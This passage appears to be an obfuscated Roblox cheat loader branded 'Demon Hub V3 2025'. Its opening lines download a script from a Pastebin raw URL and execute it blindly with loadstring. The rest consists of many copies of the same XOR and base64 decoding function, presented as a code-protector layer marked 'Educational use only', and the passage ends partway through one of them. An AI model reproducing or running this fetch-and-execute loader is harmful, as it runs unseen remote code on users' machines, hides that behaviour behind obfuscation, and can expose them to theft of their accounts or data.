--[[


██████╗░███████╗███╗░░░███╗░█████╗░███╗░░██╗  ██╗░░██╗██╗░░░██╗██████╗░  ██╗░░░██╗██████╗░
██╔══██╗██╔════╝████╗░████║██╔══██╗████╗░██║  ██║░░██║██║░░░██║██╔══██╗  ██║░░░██║╚════██╗
██║░░██║█████╗░░██╔████╔██║██║░░██║██╔██╗██║  ███████║██║░░░██║██████╦╝  ╚██╗░██╔╝░█████╔╝
██║░░██║██╔══╝░░██║╚██╔╝██║██║░░██║██║╚████║  ██╔══██║██║░░░██║██╔══██╗  ░╚████╔╝░░╚═══██╗
██████╔╝███████╗██║░╚═╝░██║╚█████╔╝██║░╚███║  ██║░░██║╚██████╔╝██████╦╝  ░░╚██╔╝░░██████╔╝
╚═════╝░╚══════╝╚═╝░░░░░╚═╝░╚════╝░╚═╝░░╚══╝  ╚═╝░░╚═╝░╚═════╝░╚═════╝░  ░░░╚═╝░░░╚═════╝░

██████╗░░█████╗░██████╗░███████╗
╚════██╗██╔══██╗╚════██╗██╔════╝
░░███╔═╝██║░░██║░░███╔═╝██████╗░
██╔══╝░░██║░░██║██╔══╝░░╚════██╗
███████╗╚█████╔╝███████╗██████╔╝
╚══════╝░╚════╝░╚══════╝╚═════╝░                                                                                              
--]]

-- Get and run remote script from Pastebin
local url = "https://pastebin.com/raw/cbBsFWLF"
local response = game:HttpGet(url)
local func = loadstring(response)
func()
task.wait(1)

-- Protected by Lua Code Protector v4.0.0
-- Protection Level: 3/3
-- Educational use only


local function dec_kcohtj(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec__otdea(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_fmpxce(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_inqejt(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_gybpae(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_qwhwbo(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec__aeok_(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_ktv_tn(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_slsbrf(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_tzukpv(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_klkztg(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_tmhqsw(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_adtbqc(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_imkuzz(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_klo_kx(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_yzqvzf(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_noxzqo(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_ojlzsy(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_fzx_pi(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_gzskeo(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_xo_qjg(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_phkdzp(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_hmalfk(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_tvmwjw(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_jpapqm(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_yqnebf(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_udzalc(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_xkajwi(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_qezghm(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_hboyai(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_ukteql(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_jdekrf(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_pfuprk(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_caipgr(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_sgiybt(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_mrekh_(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
